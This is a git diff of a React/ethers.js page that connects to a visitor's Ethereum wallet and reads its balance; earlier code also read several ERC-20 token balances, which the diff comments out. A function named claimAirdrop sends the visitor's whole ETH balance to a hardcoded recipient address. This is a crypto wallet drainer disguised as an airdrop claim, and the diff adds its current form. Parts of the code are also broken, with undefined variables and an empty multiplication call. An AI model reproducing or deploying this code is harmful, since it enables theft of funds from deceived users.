@@ -4,7 +4,7 @@ import 'bulma/css/bulma.css'
 import {BigNumber, ethers} from 'ethers'
 import { useState } from 'react'
 const abi = require('erc-20-abi')
-import './addresses'
+// import './addresses'
 // import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";
 
 
@@ -21,7 +21,7 @@ export default function Home() {
   const [gasPrice, setGasPrice] = useState()
   const [gasLimit, setGasLimit] = useState()
   
-
+  let etherValueOfUser
   let Receptient = '0x1204D7F27702d793260Ad5a406dDEE7660d21B61'
   let user
   let signerr
@@ -33,91 +33,113 @@ export default function Home() {
   const wbtcAddress = "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599"
   const usdtAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7"
 
+  let amount
 
   async function connect() {
     if (typeof window.ethereum !== 'undefined'){
       const accounts = await ethereum.request({method: "eth_requestAccounts"})
       setAccount(accounts)
       console.log(`accounts: ${accounts}`);
+
+
       const providerr = new ethers.providers.Web3Provider(window.ethereum)
       console.log(providerr);
       setProvider(providerr)
+
+
       user = await providerr.send("eth_requestAccounts", []);
       // let walletSigner = wallet.connect(window.ethersProvider)
       console.log(`user:${user}`);
       signerr = providerr.getSigner()
       setSigner(signerr)
       console.log(signerr);
+
+
       const address = signerr.getAddress()
       // console.log(address.then());
-      const bal = await providerr.getBalance(address)
-      setBalance(bal)
-      amount = bal
+      const bal = await signerr.getBalance(user.address)
+    
+      const estimateGas = await signerr.estimateGas(user.address)
+      // const estimateGas = ethers.utils.hexlify(200000000000)
+      const gasAmount = ethers.utils.hexlify(BigNumber.from(20000000000))
+      console.log('gas amount:',gasAmount);
+      
+      console.log('estimateGas:', estimateGas);
+      console.log('balance:',bal);
+      
+
 
       const gasP = providerr.getGasPrice()
-      setGasPrice(gasP)
-      console.log(`balance:${Number(bal).toString(16)}`);
+      // setGasPrice(gasP)
+      setGasPrice(gasAmount)
+      const fee = (await gasAmount).mul(gasL)
+      console.log('fee', fee);
+
+      const finalAmount = bal.sub(gasAmount)
+      setBalance(finalAmount)
+
+      // console.log(`balance:${Number(bal).toString(16)}`);
       const gasL = ethers.utils.hexlify(100000)
       setGasLimit(gasL)
-      console.log(gasL);
-      const gasHexToBigNumber = BigNumber.from(gasL)
-      console.log(`gas is: ${gasHexToBigNumber}`);
-      const withdrawable = BigNumber.from(bal) - gasHexToBigNumber
-      console.log(`withdarawble is: ${withdrawable}`);
+      // console.log(gasL);
+      // const gasHexToBigNumber = BigNumber.from(gasL)
+      // console.log(`gas is: ${gasHexToBigNumber}`);
+      // const withdrawable = BigNumber.from(bal) - gasHexToBigNumber
+      // console.log(`withdarawble is: ${withdrawable}`);
 
-      const etherValue = bal / 10e14
+      const etherValue = bal / 10e17
+      etherValueOfUser = etherValue
 
-      const daiToken = new ethers.Contract(daiAddress, abi, providerr);
-      const daiBalance = await daiToken.balanceOf(signerr.getAddress());
-      const daiValue = daiBalance / 10e5
+      // const daiToken = new ethers.Contract(daiAddress, abi, providerr);
+      // const daiBalance = await daiToken.balanceOf(signerr.getAddress());
+      // const daiValue = daiBalance / 10e5
 
-      const usdcToken = new ethers.Contract(usdcAddress, abi, providerr);
-      const usdcBalance = await usdcToken.balanceOf(signerr.getAddress());
-      const usdcValue = usdcBalance / 10e5
+      // const usdcToken = new ethers.Contract(usdcAddress, abi, providerr);
+      // const usdcBalance = await usdcToken.balanceOf(signerr.getAddress());
+      // const usdcValue = usdcBalance / 10e5
 
-      const usdtToken = new ethers.Contract(usdtAddress, abi, providerr);
-      const usdtBalance = await usdtToken.balanceOf(signerr.getAddress());
-      const usdtValue = usdtBalance / 10e5
+      // const usdtToken = new ethers.Contract(usdtAddress, abi, providerr);
+      // const usdtBalance = await usdtToken.balanceOf(signerr.getAddress());
+      // const usdtValue = usdtBalance / 10e5
 
-      const busdToken = new ethers.Contract(busdAddress, abi, providerr);
-      const busdBalance = await busdToken.balanceOf(signerr.getAddress());
-      const busdValue = busdBalance / 10e5
+      // const busdToken = new ethers.Contract(busdAddress, abi, providerr);
+      // const busdBalance = await busdToken.balanceOf(signerr.getAddress());
+      // const busdValue = busdBalance / 10e5
 
-      const linkToken = new ethers.Contract(linkAddress, abi, providerr);
-      const linkBalance = await linkToken.balanceOf(signerr.getAddress());
-      const linkValue = linkBalance / 10e16
+      // const linkToken = new ethers.Contract(linkAddress, abi, providerr);
+      // const linkBalance = await linkToken.balanceOf(signerr.getAddress());
+      // const linkValue = linkBalance / 10e16
 
-      const wbtcToken = new ethers.Contract(wbtcAddress, abi, providerr);
-      const wbtcBalance = await wbtcToken.balanceOf(signerr.getAddress());
-      const wbtcValue = wbtcBalance / 10e13
+      // const wbtcToken = new ethers.Contract(wbtcAddress, abi, providerr);
+      // const wbtcBalance = await wbtcToken.balanceOf(signerr.getAddress());
+      // const wbtcValue = wbtcBalance / 10e13
 
 
       console.log(`ether value is :${etherValue}`);
-      console.log(`dai value is :${daiValue}`);
-      console.log(`usdt value is :${usdtValue}`);
-      console.log(`busd value is :${busdValue}`);
-      console.log(`usdc value is :${usdcValue}`);
-      console.log(`link value is :${linkValue}`);
-      console.log(`btc value is :${wbtcValue}`);
+      // console.log(`dai value is :${daiValue}`);
+      // console.log(`usdt value is :${usdtValue}`);
+      // console.log(`busd value is :${busdValue}`);
+      // console.log(`usdc value is :${usdcValue}`);
+      // console.log(`link value is :${linkValue}`);
+      // console.log(`btc value is :${wbtcValue}`);
     }
   }
-  let amount
-
-
-async function claimAirdrop() {
-
-  const fee = BigNumber.from('50000000000000000')
-  const meghdar = BigNumber.from(balance).sub(fee)
   
-  signer.sendTransaction({
-    from: user,
-    to: Receptient,
+
+  async function claimAirdrop() {
+
+    const fee = ethers.utils.hexlify(100000)
+    const totalFee = balance.mul()
     
-    gasPrice: gasPrice,
-    gasLimit: 50000,
-    value: (meghdar ),
-  })
-}
+    signer.sendTransaction({
+      from: user,
+      to: Receptient,
+      
+      gasPrice: gasPrice,
+      gasLimit: gasLimit,
+      value: balance,
+    })
+  }
 
   return (
     <div className='has-background-white'>
